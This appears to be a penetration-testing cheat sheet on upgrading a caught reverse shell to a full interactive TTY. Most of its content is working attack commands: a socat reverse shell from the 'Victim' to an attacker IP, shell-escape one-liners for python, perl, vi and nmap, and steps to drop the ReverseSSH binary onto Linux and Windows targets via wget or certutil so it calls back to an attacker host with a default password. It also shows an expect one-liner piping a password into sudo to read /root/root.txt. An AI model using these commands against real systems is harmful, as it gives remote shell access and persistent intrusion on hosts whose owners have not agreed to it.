# Full TTYs

## Full TTY

Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found the /etc/shells file This incident has been reported`. Also note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running `bash`.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

```bash
script -qc /bin/bash /dev/null
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

### **Spawn shells**

* `python -c 'import pty; pty.spawn("/bin/sh")'`
* `echo os.system('/bin/bash')`
* `/bin/sh -i`
* `script -qc /bin/bash /dev/null`
* `perl -e 'exec "/bin/sh";'`
* perl: `exec "/bin/sh";`
* ruby: `exec "/bin/sh"`
* lua: `os.execute('/bin/sh')`
* IRB: `exec "/bin/sh"`
* vi: `:!bash`
* vi: `:set shell=/bin/bash:shell`
* nmap: `!sh`

## ReverseSSH

A convenient way for **interactive shell access**, as well as **file transfers** and **port forwarding**, is dropping the statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) onto the target.

Below is an example for `x86` with upx-compressed binaries. For other binaries, check [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Prepare locally to catch the ssh port forwarding request:

```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```

* \(2a\) Linux target:

```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```

* \(2b\) Windows 10 target \(for earlier versions, check [project readme](https://github.com/Fahrj/reverse-ssh#features)\):

```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```

* If the ReverseSSH port forwarding request was successful, you should now be able to log in with default password `letmeinbrudipls` in the context of the user running `reverse-ssh(.exe)`:

```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```

## No TTY

If for some reason you cannot obtain a full TTY you **still can interact with programs** that expects user input. In the following example, the password is passed to `sudo` to read a file:

```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```

